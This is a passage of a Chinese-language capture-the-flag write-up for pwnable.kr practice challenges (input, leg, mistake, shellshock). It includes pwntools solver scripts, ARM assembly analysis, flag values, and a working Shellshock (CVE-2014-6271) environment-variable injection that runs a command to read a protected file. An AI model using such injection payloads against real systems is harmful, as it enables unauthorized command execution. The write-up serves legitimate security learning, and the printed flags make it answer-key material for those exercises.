sd = socket(AF_INET, SOCK_STREAM, 0);   // 创建一个可以使用IPv4地址进行通信的套接字，指定使用TCP协议
if(sd == -1){
    printf("socket error, tell admin\n");
    return 0;
}
saddr.sin_family = AF_INET;
saddr.sin_addr.s_addr = INADDR_ANY;
saddr.sin_port = htons( atoi(argv['C']) );   // 程序由第66个参数指定端口
if(bind(sd, (struct sockaddr*)&saddr, sizeof(saddr)) < 0){  // 使用bind函数将套接字绑定到指定的地址和端口上
    printf("bind error, use another port\n");
    return 1;
}
listen(sd, 1);  // 使用listen函数开始监听连接请求，最大连接数为1
int c = sizeof(struct sockaddr_in);
cd = accept(sd, (struct sockaddr *)&caddr, (socklen_t*)&c); // 接受客户端的连接请求，新套接字cd用于与客户端进行通信
if(cd < 0){
    printf("accept error, tell admin\n");
    return 0;
}
if( recv(cd, buf, 4, 0) != 4 ) return 0;  // 从客户端接收数据，最多接收4字节存储在buf中，
if(memcmp(buf, "\xde\xad\xbe\xef", 4)) return 0;  // 如果接收的数据与"\xde\xad\xbe\xef"相等则通过验证
printf("Stage 5 clear!\n");
```

所以我们需要在程序的第`66`个参数添加端口号，并建立网络连接发送`4`个字节的数据`"\xde\xad\xbe\xef"`。完整的`Python`代码如下：

```python
from pwn import *
import os

shell = ssh(user='input2', host='pwnable.kr', port=2222, password='guest')
# Stage 1
args = ['A']*100
args[ord('A')] = '\x00'
args[ord('B')] = '\x20\x0a\x0d'
# Stage 2
r1, w1 = os.pipe()
os.write(w1, b'\x00\x0a\x00\xff')
r2, w2 = os.pipe()
os.write(w2, b'\x00\x0a\x02\xff')
# Stage 3
env = {'\xde\xad\xbe\xef': '\xca\xfe\xba\xbe'}
# Stage 4
with open('\x0a', 'w') as f:
    f.write('\x00\x00\x00\x00')  
# Stage 5
port = 6666
args[ord('C')] = str(port)
io = shell.process(executable='./input', argv=args, stdin=r1, stderr=r2, env=env)
net = remote(shell.host, port)
net.sendline(b'\xde\xad\xbe\xef')
io.interactive()
io.close()
shell.close()
```

然而打不通！woc！`[ERROR] Could not connect to pwnable.kr on port 6666`。先`ssh`进入目标系统，然后以`input2@pwnable`的身份在`/tmp`目录下编写并运行`.py`文件，这样应该就不会因为防火墙的问题无法连接端口建立通信啦。

```bash
input2@pwnable:~$ mkdir /tmp/t0ur1st
input2@pwnable:~$ cd /tmp/t0ur1st
input2@pwnable:/tmp/t0ur1st$ ln -s /home/input2/flag flag
input2@pwnable:/tmp/t0ur1st$ vim exp.py
```

在`exp.py`中编写以下`Python`代码：

```python
from pwn import *
import os

args = ['A']*100
args[ord('A')] = '\x00'
args[ord('B')] = '\x20\x0a\x0d'
# Stage 2
r1, w1 = os.pipe()
os.write(w1, b'\x00\x0a\x00\xff')
r2, w2 = os.pipe()
os.write(w2, b'\x00\x0a\x02\xff')
# Stage 3
env = {'\xde\xad\xbe\xef': '\xca\xfe\xba\xbe'}
# Stage 4
with open('\x0a', 'w') as f:
    f.write('\x00\x00\x00\x00')
# Stage 5
port = 6666
args[ord('C')] = str(port)
io = process(executable='/home/input2/input', argv=args, stdin=r1, stderr=r2, env=env)
net = remote('localhost', port)
net.sendline('\xde\xad\xbe\xef')
io.interactive()
```

`:wq`保存退出`vim`后运行`exp.py`可以得到`flag`：`Mommy! I learned how to pass various input in Linux :)`。

```bash
input2@pwnable:/tmp/t0ur1st$ python exp.py
[+] Starting local process '/home/input2/input': pid 147462
[+] Opening connection to localhost on port 6666: Done
[*] Switching to interactive mode
Welcome to pwnable.kr
Let's see if you know how to give input to program
Just give me correct inputs then you will get the flag :)
Stage 1 clear!
Stage 2 clear!
Stage 3 clear!
Stage 4 clear!
Stage 5 clear!
[*] Process '/home/input2/input' stopped with exit code 0 (pid 147462)
Mommy! I learned how to pass various input in Linux :)
```

------

### leg

这是**Pwnable.kr**的第八个挑战`leg`，来自**[Toddler's Bottle]**部分。

```bash
Daddy told me I should study arm.
But I prefer to study my leg!

Download : http://pwnable.kr/bin/leg.c
Download : http://pwnable.kr/bin/leg.asm

ssh leg@pwnable.kr -p2222 (pw:guest)
```

首先通过`ssh`远程连接目标主机，这是失败啦？！并没有，只是显示形式跟以前不一样而已。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ ssh leg@pwnable.kr -p2222
leg@pwnable.kr's password: 
 ____  __    __  ____    ____  ____   _        ___      __  _  ____  
|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    / 
|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
                                                                     
- Site admin : daehee87@khu.ac.kr
- irc.netgarage.org:6667 / #pwnable.kr
- Simply type "irssi" command to join IRC now
- files under /tmp can be erased anytime. make your directory under /tmp
- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
You have new mail.
Last login: Fri Jun  9 02:22:19 2023 from 121.18.90.140
pulseaudio: pa_context_connect() failed
pulseaudio: Reason: Connection refused
pulseaudio: Failed to initialize PA contextaudio: Could not init `pa' audio driver
ALSA lib confmisc.c:768:(parse_card) cannot find card '0'
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_card_driver returned error: No such file or directory
ALSA lib confmisc.c:392:(snd_func_concat) error evaluating strings
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_concat returned error: No such file or directory
ALSA lib confmisc.c:1251:(snd_func_refer) error evaluating name
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_refer returned error: No such file or directory
ALSA lib conf.c:4771:(snd_config_expand) Evaluate error: No such file or directory
ALSA lib pcm.c:2266:(snd_pcm_open_noupdate) Unknown PCM default
alsa: Could not initialize DAC
alsa: Failed to open `default':
alsa: Reason: No such file or directory
ALSA lib confmisc.c:768:(parse_card) cannot find card '0'
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_card_driver returned error: No such file or directory
ALSA lib confmisc.c:392:(snd_func_concat) error evaluating strings
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_concat returned error: No such file or directory
ALSA lib confmisc.c:1251:(snd_func_refer) error evaluating name
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_refer returned error: No such file or directory
ALSA lib conf.c:4771:(snd_config_expand) Evaluate error: No such file or directory
ALSA lib pcm.c:2266:(snd_pcm_open_noupdate) Unknown PCM default
alsa: Could not initialize DAC
alsa: Failed to open `default':
alsa: Reason: No such file or directory
audio: Failed to create voice `lm4549.out'
Uncompressing Linux... done, booting the kernel.
[    0.000000] Booting Linux on physical CPU 0x0
[    0.000000] Linux version 3.11.4 (acez@pondicherry) (gcc version 4.7.3 (Sourcery CodeBench Lite 2013.05-24) ) #5 Sat Oct 12 00:15:00 EDT 2013
[    0.000000] CPU: ARM926EJ-S [41069265] revision 5 (ARMv5TEJ), cr=00093177
[    0.000000] CPU: VIVT data cache, VIVT instruction cache
[    0.000000] Machine: ARM-Versatile PB
[    0.000000] Memory policy: ECC disabled, Data cache writeback
[    0.000000] sched_clock: 32 bits at 24MHz, resolution 41ns, wraps every 178956ms
[    0.000000] Built 1 zonelists in Zone order, mobility grouping on.  Total pages: 16256
[    0.000000] Kernel command line: 'root=/dev/ram rw console=ttyAMA0 rdinit=/sbin/init oops=panic panic=1 quiet'
[    0.000000] PID hash table entries: 256 (order: -2, 1024 bytes)
[    0.000000] Dentry cache hash table entries: 8192 (order: 3, 32768 bytes)
[    0.000000] Inode-cache hash table entries: 4096 (order: 2, 16384 bytes)
[    0.000000] Memory: 59760K/65536K available (2522K kernel code, 150K rwdata, 656K rodata, 112K init, 93K bss, 5776K reserved)
[    0.000000] Virtual kernel memory layout:
[    0.000000]     vector  : 0xffff0000 - 0xffff1000   (   4 kB)
[    0.000000]     fixmap  : 0xfff00000 - 0xfffe0000   ( 896 kB)
[    0.000000]     vmalloc : 0xc4800000 - 0xff000000   ( 936 MB)
[    0.000000]     lowmem  : 0xc0000000 - 0xc4000000   (  64 MB)
[    0.000000]     modules : 0xbf000000 - 0xc0000000   (  16 MB)
[    0.000000]       .text : 0xc0008000 - 0xc0322cc8   (3180 kB)
[    0.000000]       .init : 0xc0323000 - 0xc033f22c   ( 113 kB)
[    0.000000]       .data : 0xc0340000 - 0xc0365b20   ( 151 kB)
[    0.000000]        .bss : 0xc0365b20 - 0xc037d2bc   (  94 kB)
[    0.000000] NR_IRQS:224
[    0.000000] VIC @f1140000: id 0x00041190, vendor 0x41
[    0.000000] FPGA IRQ chip 0 "SIC" @ f1003000, 13 irqs
[    0.000000] Console: colour dummy device 80x30
[    0.016940] Calibrating delay loop... 597.19 BogoMIPS (lpj=2985984)
[    0.174364] pid_max: default: 32768 minimum: 301
[    0.175031] Mount-cache hash table entries: 512
[    0.180933] CPU: Testing write buffer coherency: ok
[    0.185824] Setting up static identity map for 0xc0265c80 - 0xc0265cbc
[    0.194838] NET: Registered protocol family 16
[    0.196256] DMA: preallocated 256 KiB pool for atomic coherent allocations
[    0.200731] Serial: AMBA PL011 UART driver
[    0.202016] dev:f1: ttyAMA0 at MMIO 0x101f1000 (irq = 44) is a PL011 rev1
[    0.208510] console [ttyAMA0] enabled
[    0.209503] dev:f2: ttyAMA1 at MMIO 0x101f2000 (irq = 45) is a PL011 rev1
[    0.209928] dev:f3: ttyAMA2 at MMIO 0x101f3000 (irq = 46) is a PL011 rev1
[    0.210309] fpga:09: ttyAMA3 at MMIO 0x10009000 (irq = 70) is a PL011 rev1
[    0.216279] bio: create slab <bio-0> at 0
[    0.222884] Switched to clocksource timer3
[    0.230747] NET: Registered protocol family 2
[    0.235390] TCP established hash table entries: 512 (order: 0, 4096 bytes)
[    0.235637] TCP bind hash table entries: 512 (order: -1, 2048 bytes)
[    0.235916] TCP: Hash tables configured (established 512 bind 512)
[    0.236516] TCP: reno registered
[    0.236687] UDP hash table entries: 256 (order: 0, 4096 bytes)
[    0.236922] UDP-Lite hash table entries: 256 (order: 0, 4096 bytes)
[    0.238401] NET: Registered protocol family 1
[    0.240729] RPC: Registered named UNIX socket transport module.
[    0.240931] RPC: Registered udp transport module.
[    0.241063] RPC: Registered tcp transport module.
[    0.241188] RPC: Registered tcp NFSv4.1 backchannel transport module.
[    0.245724] Trying to unpack rootfs image as initramfs...
[    0.414702] Freeing initrd memory: 1584K (c2000000 - c218c000)
[    0.415048] NetWinder Floating Point Emulator V0.97 (double precision)
[    0.420812] Installing knfsd (copyright (C) 1996 okir@monad.swb.de).
[    0.421653] msgmni has been set to 119
[    0.445608] Block layer SCSI generic (bsg) driver version 0.4 loaded (major 254)
[    0.445936] io scheduler noop registered
[    0.446089] io scheduler deadline registered
[    0.446310] io scheduler cfq registered (default)
[    0.447059] clcd-pl11x dev:20: PL110 rev0 at 0x10120000
[    0.449213] clcd-pl11x dev:20: Versatile hardware, VGA display
[    0.479890] Console: switching to colour frame buffer device 80x60
[    0.492416] brd: module loaded
[    0.493277] physmap platform flash device: 04000000 at 34000000
[    0.501322] physmap-flash.0: Found 1 x32 devices at 0x0 in 32-bit bank. Manufacturer ID 0x000000 Chip ID 0x000000
[    0.501892] Intel/Sharp Extended Query Table at 0x0031
[    0.502472] Using buffer write method
[    0.510258] smc91x.c: v1.1, sep 22 2004 by Nicolas Pitre <nico@fluxnic.net>
[    0.523752] eth0: SMC91C11xFD (rev 1) at c496e000 IRQ 57 [nowait]
[    0.524028] eth0: Ethernet addr: 52:54:00:12:34:56
[    0.525246] mousedev: PS/2 mouse device common for all mice
[    0.528698] TCP: cubic registered
[    0.528842] NET: Registered protocol family 17
[    0.529524] NET: Registered protocol family 37
[    0.529773] VFP support v0.3: implementor 41 architecture 1 part 10 variant 9 rev 0
[    0.538801] Freeing unused kernel memory: 112K (c0323000 - c033f000)
cttyhack: can't open '/dev/ttyS0': No such file or directory
sh: can't access tty; job control turned off
/ $ [    0.626218] input: AT Raw Set 2 keyboard as /devices/fpga:06/serio0/input/input0
[    1.225792] input: ImExPS/2 Generic Explorer Mouse as /devices/fpga:07/serio1/input/input1
```

然后输入`ls -la`显示所有文件及目录，并将文件型态、权限、拥有者、文件大小等信息详细列出。

```bash
/ $ ls -la
total 628
drwxr-xr-x   11 root     0                0 Nov 10  2014 .
drwxr-xr-x   11 root     0                0 Nov 10  2014 ..
drwxrwxr-x    2 root     0                0 Nov 10  2014 bin
drwxrwxr-x    2 root     0                0 Nov 10  2014 boot
drwxrwxr-x    2 root     0                0 Nov 10  2014 dev
drwxrwxr-x    3 root     0                0 Nov 10  2014 etc
-r--------    1 1001     0               38 Nov 10  2014 flag
---s--x---    1 1001     1000        636419 Nov 10  2014 leg
lrwxrwxrwx    1 root     0               11 Nov 10  2014 linuxrc -> bin/busybox
dr-xr-xr-x   32 root     0                0 Jan  1 00:00 proc
drwxrwxr-x    2 root     0                0 Nov 10  2014 root
drwxrwxr-x    2 root     0                0 Nov 10  2014 sbin
drwxrwxr-x    2 root     0                0 Nov 10  2014 sys
drwxrwxr-x    4 root     0                0 Nov 10  2014 usr
```

先回到自己的系统，来看看题目提供的`.c`文件。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ wget http://pwnable.kr/bin/leg.c 

┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ cat ./leg.c
#include <stdio.h>
#include <fcntl.h>

int key1(){
    asm("mov r3, pc\n");
}

int key2(){
    asm(
    "push   {r6}\n"
    "add    r6, pc, $1\n"
    "bx     r6\n"
    ".code   16\n"
    "mov    r3, pc\n"
    "add    r3, $0x4\n"
    "push   {r3}\n"
    "pop    {pc}\n"
    ".code  32\n"
    "pop    {r6}\n"
    );
}

int key3(){
    asm("mov r3, lr\n");
}

int main(){
    int key=0;
    printf("Daddy has very strong arm! : ");
    scanf("%d", &key);
    if( (key1()+key2()+key3()) == key ){
        printf("Congratz!\n");
        int fd = open("flag", O_RDONLY);
        char buf[100];
        int r = read(fd, buf, 100);
        write(0, buf, r);
    }
    else{
        printf("I have strong leg :P\n");
    }
    return 0;
}
```

通过审计`C`语言代码可知，我们需要输入一个`key`使得表达式`(key1()+key2()+key3()) == key`为真。再来看看`leg.asm`。

```assembly
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ wget http://pwnable.kr/bin/leg.asm

┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ cat ./leg.asm                     
(gdb) disass main
Dump of assembler code for function main:
   0x00008d3c <+0>:     push    {r4, r11, lr}
   0x00008d40 <+4>:     add     r11, sp, #8
   0x00008d44 <+8>:     sub     sp, sp, #12
   0x00008d48 <+12>:    mov     r3, #0
   0x00008d4c <+16>:    str     r3, [r11, #-16]
   0x00008d50 <+20>:    ldr     r0, [pc, #104]  ; 0x8dc0 <main+132>
   0x00008d54 <+24>:    bl      0xfb6c <printf>
   0x00008d58 <+28>:    sub     r3, r11, #16
   0x00008d5c <+32>:    ldr     r0, [pc, #96]   ; 0x8dc4 <main+136>
   0x00008d60 <+36>:    mov     r1, r3
   0x00008d64 <+40>:    bl      0xfbd8 <__isoc99_scanf>
   0x00008d68 <+44>:    bl      0x8cd4 <key1>
   0x00008d6c <+48>:    mov     r4, r0
   0x00008d70 <+52>:    bl      0x8cf0 <key2>
   0x00008d74 <+56>:    mov     r3, r0
   0x00008d78 <+60>:    add     r4, r4, r3
   0x00008d7c <+64>:    bl      0x8d20 <key3>
   0x00008d80 <+68>:    mov     r3, r0
   0x00008d84 <+72>:    add     r2, r4, r3
   0x00008d88 <+76>:    ldr     r3, [r11, #-16]
   0x00008d8c <+80>:    cmp     r2, r3
   0x00008d90 <+84>:    bne     0x8da8 <main+108>
   0x00008d94 <+88>:    ldr     r0, [pc, #44]   ; 0x8dc8 <main+140>
   0x00008d98 <+92>:    bl      0x1050c <puts>
   0x00008d9c <+96>:    ldr     r0, [pc, #40]   ; 0x8dcc <main+144>
   0x00008da0 <+100>:   bl      0xf89c <system>
   0x00008da4 <+104>:   b       0x8db0 <main+116>
   0x00008da8 <+108>:   ldr     r0, [pc, #32]   ; 0x8dd0 <main+148>
   0x00008dac <+112>:   bl      0x1050c <puts>
   0x00008db0 <+116>:   mov     r3, #0
   0x00008db4 <+120>:   mov     r0, r3
   0x00008db8 <+124>:   sub     sp, r11, #8
   0x00008dbc <+128>:   pop     {r4, r11, pc}
   0x00008dc0 <+132>:   andeq   r10, r6, r12, lsl #9
   0x00008dc4 <+136>:   andeq   r10, r6, r12, lsr #9
   0x00008dc8 <+140>:                   ; <UNDEFINED> instruction: 0x0006a4b0
   0x00008dcc <+144>:                   ; <UNDEFINED> instruction: 0x0006a4bc
   0x00008dd0 <+148>:   andeq   r10, r6, r4, asr #9
End of assembler dump.
(gdb) disass key1
Dump of assembler code for function key1:
   0x00008cd4 <+0>:     push    {r11}           ; (str r11, [sp, #-4]!)
   0x00008cd8 <+4>:     add     r11, sp, #0
   0x00008cdc <+8>:     mov     r3, pc
   0x00008ce0 <+12>:    mov     r0, r3
   0x00008ce4 <+16>:    sub     sp, r11, #0
   0x00008ce8 <+20>:    pop     {r11}           ; (ldr r11, [sp], #4)
   0x00008cec <+24>:    bx      lr
End of assembler dump.
(gdb) disass key2
Dump of assembler code for function key2:
   0x00008cf0 <+0>:     push    {r11}           ; (str r11, [sp, #-4]!)
   0x00008cf4 <+4>:     add     r11, sp, #0
   0x00008cf8 <+8>:     push    {r6}            ; (str r6, [sp, #-4]!)
   0x00008cfc <+12>:    add     r6, pc, #1
   0x00008d00 <+16>:    bx      r6
   0x00008d04 <+20>:    mov     r3, pc
   0x00008d06 <+22>:    adds    r3, #4
   0x00008d08 <+24>:    push    {r3}
   0x00008d0a <+26>:    pop     {pc}
   0x00008d0c <+28>:    pop     {r6}            ; (ldr r6, [sp], #4)
   0x00008d10 <+32>:    mov     r0, r3
   0x00008d14 <+36>:    sub     sp, r11, #0
   0x00008d18 <+40>:    pop     {r11}           ; (ldr r11, [sp], #4)
   0x00008d1c <+44>:    bx      lr
End of assembler dump.
(gdb) disass key3
Dump of assembler code for function key3:
   0x00008d20 <+0>:     push    {r11}           ; (str r11, [sp, #-4]!)
   0x00008d24 <+4>:     add     r11, sp, #0
   0x00008d28 <+8>:     mov     r3, lr
   0x00008d2c <+12>:    mov     r0, r3
   0x00008d30 <+16>:    sub     sp, r11, #0
   0x00008d34 <+20>:    pop     {r11}           ; (ldr r11, [sp], #4)
   0x00008d38 <+24>:    bx      lr
End of assembler dump.
```

这是`ARM`体系架构的汇编程序，查看main <+48>，<+56>，<+68>，可以看到返回值存储在`$r0`寄存器中。先来看`key1()`，当调用 `key1()` 函数时，会执行该汇编指令，将 `$pc` 寄存器的值（即下一条指令的地址）移动到 `r3` 寄存器中，并成为函数的返回值。该汇编指令执行完后，程序计数器`$pc`跳转到了下一条的指令，而指令计数器又用于存放下一条指令所在单元的地址，此时是`0x00008ce4`。

```assembly
0x00008cdc <+8>:     mov     r3, pc
0x00008ce0 <+12>:    mov     r0, r3   # 上条指令执行完后这条指令为当前指令，PC指向下一条指令所在单元的地址
0x00008ce4 <+16>:    sub     sp, r11, #0
```

因此`key1()`的返回值是`0x00008ce4`。接着来看`key2()`，当程序运行完`0x00008d04`处的指令时，`$pc`此时值为`0x00008d08`，所以`$r3`被赋值为`0x00008d08`，接着执行完指令`0x00008d06 <+22>:  adds r3, #4`后，`$r3`的值为`0x00008d0c`。之后`$r3`寄存器没有再被修改。

```assembly
0x00008cf8 <+8>:     push    {r6}            ; (str r6, [sp, #-4]!)
0x00008cfc <+12>:    add     r6, pc, #1
0x00008d00 <+16>:    bx      r6
0x00008d04 <+20>:    mov     r3, pc
0x00008d06 <+22>:    adds    r3, #4
0x00008d08 <+24>:    push    {r3}
0x00008d0a <+26>:    pop     {pc}
0x00008d0c <+28>:    pop     {r6}            ; (ldr r6, [sp], #4)
```

因此`key2()`的返回值是`0x00008d0c`，为什么`key2()` 函数的返回值还是由`$r3`决定呢？ 

> `int key2()` 函数使用汇编指令来获取当前指令的地址并将其作为返回值。下面是对`key2()` 函数中代码的解释：
>
> 1. 首先，将 `r6` 寄存器保存到栈中，为了后续的恢复。
> 2. 使用 `add r6, pc, $1` 指令将 `pc` 寄存器的值加 1，并将结果存储在 `r6` 寄存器中。
> 3. 使用 `bx r6` 指令将程序控制转移到 `r6` 寄存器所指示的地址。
> 4. 使用 `.code 16` 指令切换到 16 位 Thumb 指令集。
> 5. 使用 `mov r3, pc` 指令将 `pc` 寄存器的值移动到 `r3` 寄存器中。
> 6. 使用 `add r3, $0x4` 指令将 `r3` 寄存器的值增加 4，即跳过下一条指令的地址，使其指向函数的下一条指令。
> 7. 将 `r3` 寄存器的值保存到栈中。
> 8. 使用 `pop {pc}` 指令将栈顶的值弹出到 `pc` 寄存器中，即将 `r3` 寄存器中的值作为返回地址。
> 9. 使用 `.code 32` 指令切换回 32 位 ARM 指令集。
> 10. 最后，恢复之前保存的 `r6` 寄存器的值。
>
> 因此，通过执行这些汇编指令，将 `pc` 寄存器中的值移动到 `r3` 寄存器中，并将其作为函数的返回值返回给调用方。

最后来看`key3()`，结果存储在`$r3`，其值为`$lr`，而`$lr`存储着返回地址。

```assembly
0x00008d28 <+8>:     mov     r3, lr
0x00008d2c <+12>:    mov     r0, r3
```

回过头看`main`的汇编代码，发现返回地址是`0x00008d80`。

```assembly
0x00008d7c <+64>:    bl      0x8d20 <key3>
0x00008d80 <+68>:    mov     r3, r0
```

因此`key3()`的返回值是`0x00008d80`，所以`key = 0x00008ce4 + 0x00008d0c + 0x00008d80 = 108400`。

`SSH`连接目标系统，在终端运行二进制文件`leg`，并输入`key`值`108400`，得到`flag`：`My daddy has a lot of ARMv5te muscle!`。

```bash
$ ./leg
Daddy has very strong arm! : 108400
Congratz!
My daddy has a lot of ARMv5te muscle!
```

------

### mistake

这是**Pwnable.kr**的第九个挑战`mistake`，来自**[Toddler's Bottle]**部分。

```bash
We all make mistakes, let's move on.
(don't take this too seriously, no fancy hacking skill is required at all)

This task is based on real event
Thanks to dhmonkey

hint : operator priority

ssh mistake@pwnable.kr -p2222 (pw:guest)
```

首先通过`ssh`远程连接目标主机。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ ssh mistake@pwnable.kr -p2222
mistake@pwnable.kr's password: 
 ____  __    __  ____    ____  ____   _        ___      __  _  ____  
|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    / 
|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
                                                                     
- Site admin : daehee87@khu.ac.kr
- irc.netgarage.org:6667 / #pwnable.kr
- Simply type "irssi" command to join IRC now
- files under /tmp can be erased anytime. make your directory under /tmp
- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
You have mail.
Last login: Fri Jun  9 04:26:08 2023 from 77.127.99.41
```

然后输入`ls -la`显示所有文件及目录，并将文件型态、权限、拥有者、文件大小等信息详细列出。

```bash
mistake@pwnable:~$ ls -la
total 44
drwxr-x---   5 root        mistake 4096 Oct 23  2016 .
drwxr-xr-x 117 root        root    4096 Nov 10  2022 ..
d---------   2 root        root    4096 Jul 29  2014 .bash_history
-r--------   1 mistake_pwn root      51 Jul 29  2014 flag
dr-xr-xr-x   2 root        root    4096 Aug 20  2014 .irssi
-r-sr-x---   1 mistake_pwn mistake 8934 Aug  1  2014 mistake
-rw-r--r--   1 root        root     792 Aug  1  2014 mistake.c
-r--------   1 mistake_pwn root      10 Jul 29  2014 password
drwxr-xr-x   2 root        root    4096 Oct 23  2016 .pwntools-cache
```

我们可以看到三个文件`mistake`、`mistake.c`和`flag`，其中`mistake`是`ELF`二进制可执行文件，`mistake.c`是编译二进制文件的`C`代码，用户`mistake`没有权限直接查看`flag`文件中的内容，所以我们老老实实地输入`cat mistake.c`来查看`mistake.c`的代码。

```c
mistake@pwnable:~$ cat mistake.c
#include <stdio.h>
#include <fcntl.h>

#define PW_LEN 10
#define XORKEY 1

void xor(char* s, int len){
    int i;
    for(i=0; i<len; i++){
        s[i] ^= XORKEY;
    }
}

int main(int argc, char* argv[]){

    int fd;
    if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
        printf("can't open password %d\n", fd);
        return 0;
    }

    printf("do not bruteforce...\n");
    sleep(time(0)%20);

    char pw_buf[PW_LEN+1];
    int len;
    if(!(len=read(fd,pw_buf,PW_LEN) > 0)){
        printf("read error\n");
        close(fd);
        return 0;
    }

    char pw_buf2[PW_LEN+1];
    printf("input password : ");
    scanf("%10s", pw_buf2);

    // xor your input
    xor(pw_buf2, 10);

    if(!strncmp(pw_buf, pw_buf2, PW_LEN)){
        printf("Password OK\n");
        system("/bin/cat flag\n");
    }
    else{
        printf("Wrong Password\n");
    }

    close(fd);
    return 0;
}
```

先来分析主函数的这部分代码：

```c
int fd;
if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
    printf("can't open password %d\n", fd);
    return 0;
}
```

在这段代码中，编程者想的是：`open` 函数用于打开文件 `/home/mistake/password` 并返回文件描述符，然后将返回值与 `0` 进行比较。然而，由于运算符优先级的问题，条件判断的结果可能会出现错误。因为实际上，`<` 运算符的优先级高于 `=` 运算符，所以 `<` 运算符会在 `=` 运算符之前进行计算。这意味着 `open` 函数的返回值`1`会先与`0`进行比较，然后结果`0`会赋值给 `fd` 变量，因此该`if`语句实际上可以理解为`if(fd = 0)`。而`fd = 0`时是标准输入`STDIN`，这意味着用户能进行俩次输入，并且密码实际上是由用户的第一次输入所决定。用户第二次输入的密码会传递给`xor()`函数进行异或运算，所以答案已经显而易见啦。运行`./mistake`，第一次输入长度为`10`的全`1`字符串，第二次输入等长的全`0`字符串即可拿到`flag`：`Mommy, the operator priority always confuses me :(`。

```bash
mistake@pwnable:~$ ./mistake
do not bruteforce...
1111111111
input password : 0000000000
Password OK
Mommy, the operator priority always confuses me :(
```

------

### shellshock

这是**Pwnable.kr**的第十个挑战`shellshock`，来自**[Toddler's Bottle]**部分。

```bash
Mommy, there was a shocking news about bash.
I bet you already know, but lets just make it sure :)


ssh shellshock@pwnable.kr -p2222 (pw:guest)
```

首先通过`ssh`远程连接目标主机。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ ssh shellshock@pwnable.kr -p2222
shellshock@pwnable.kr's password: 
 ____  __    __  ____    ____  ____   _        ___      __  _  ____  
|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    / 
|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
                                                                     
- Site admin : daehee87@khu.ac.kr
- irc.netgarage.org:6667 / #pwnable.kr
- Simply type "irssi" command to join IRC now
- files under /tmp can be erased anytime. make your directory under /tmp
- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
You have mail.
Last login: Thu Jun  8 11:45:56 2023 from 84.110.212.230
```

然后输入`ls -la`显示所有文件及目录，并将文件型态、权限、拥有者、文件大小等信息详细列出。

```bash
shellshock@pwnable:~$ ls -la
total 980
drwxr-x---   5 root shellshock       4096 Oct 23  2016 .
drwxr-xr-x 117 root root             4096 Nov 10  2022 ..
-r-xr-xr-x   1 root shellshock     959120 Oct 12  2014 bash
d---------   2 root root             4096 Oct 12  2014 .bash_history
-r--r-----   1 root shellshock_pwn     47 Oct 12  2014 flag
dr-xr-xr-x   2 root root             4096 Oct 12  2014 .irssi
drwxr-xr-x   2 root root             4096 Oct 23  2016 .pwntools-cache
-r-xr-sr-x   1 root shellshock_pwn   8547 Oct 12  2014 shellshock
-r--r--r--   1 root root              188 Oct 12  2014 shellshock.c
```

我们可以看到四个文件`shellshock`、`shellshock.c`和`flag`还有`bash`，其中`shellshock`是`ELF`二进制可执行文件，`shellshock.c`是编译二进制文件的`C`代码，用户`shellshock`没有权限直接查看`flag`文件中的内容，所以我们老老实实地输入`cat shellshock.c`来查看`shellshock.c`的代码。

```bash
shellshock@pwnable:~$ cat shellshock.c
#include <stdio.h>
int main(){
    setresuid(getegid(), getegid(), getegid());
    setresgid(getegid(), getegid(), getegid());
    system("/home/shellshock/bash -c 'echo shock_me'");
    return 0;
}
```

该挑战来自CVE-2014-6271漏洞，这是一个被称为Shellshock的漏洞问题。系统中提供的二进制文件`bash`就具有CVE-2014-6271漏洞。我们可以输入以下内容进行测试：

```bash
env x='() { :;}; echo Fuck' ./bash -c "echo You!"
```

通过查看终端输出，我们可以确定系统提供的二进制文件`bash`能受到shellshock攻击，如果已经打了补丁的话，`bash`会静默退出。利用该漏洞，我们可以将`./shellshock`中的系统调用`system("/home/shellshock/bash -c 'echo shock_me'");`进行拼接。

```bash
env x='() { :;}; /bin/cat flag' ./shellshock
```

这样就能拿到`flag`：`only if I knew CVE-2014-6271 ten years ago..!!`。

```bash
